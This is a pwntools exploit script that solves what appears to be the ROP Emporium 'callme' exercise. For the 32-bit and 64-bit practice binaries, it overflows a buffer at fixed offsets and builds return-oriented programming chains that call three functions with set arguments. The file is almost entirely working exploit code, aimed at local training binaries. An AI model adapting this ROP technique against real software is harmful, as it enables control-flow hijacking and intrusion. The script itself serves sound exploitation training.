#!/usr/bin/python3

from pwn import *
import sys

def first_binary():

	binary = './callme32'
	io = process(binary)
	elf = context.binary = ELF(binary,checksec=False)

	eip_offset = 44
	pop_gadget = 0x080487f9

	callme_one = elf.plt.callme_one
	callme_two = elf.plt.callme_two
	callme_three = elf.plt.callme_three
	
	payload = b'a' * eip_offset + p32(callme_one) + p32(pop_gadget) + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)
	payload += p32(callme_two) + p32(pop_gadget) + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)
	payload += p32(callme_three) + p32(elf.symbols.exit) + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

	io.sendlineafter('> ',payload)
	print(io.recv())
	print(io.recv())

	return True

def second_binary():

	binary = './callme'
	io = process(binary)
	elf = context.binary = ELF(binary,checksec=False)

	rsp_offset = 40
	pop_rdi_rsi_rdx = 0x0040093c

	callme_arguments = p64(pop_rdi_rsi_rdx) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

	callme_one = callme_arguments + p64(0x00400720)
	callme_two = callme_arguments + p64(0x00400740)
	callme_three = callme_arguments + p64(0x004006f0)

	payload = b'a' * rsp_offset + callme_one + callme_two + callme_three

	io.sendlineafter('> ',payload)
	print(io.recv())
	print(io.recv())

	io.close()
	return True

if sys.argv[1] == "32":
	first_binary()
elif sys.argv[1] == "64":
	second_binary()
else:
	print("Please enter 32 or 64")